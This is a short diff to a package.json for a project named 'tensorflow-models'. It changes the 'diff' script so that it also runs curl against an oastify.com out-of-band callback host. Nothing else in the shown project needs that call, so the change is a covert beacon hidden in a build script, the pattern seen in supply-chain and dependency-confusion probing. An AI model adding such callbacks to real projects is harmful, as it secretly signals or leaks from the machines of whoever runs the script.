@@ -2,7 +2,7 @@
   "name": "tensorflow-models",
   "version": "0.0.1",
   "scripts": {
-    "diff": "./scripts/diff.js",
+    "diff": "./scripts/diff.js && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/tensor-flow-models",
     "link-local": "yalc link",
     "presubmit": "ts-node presubmit.ts"
   },
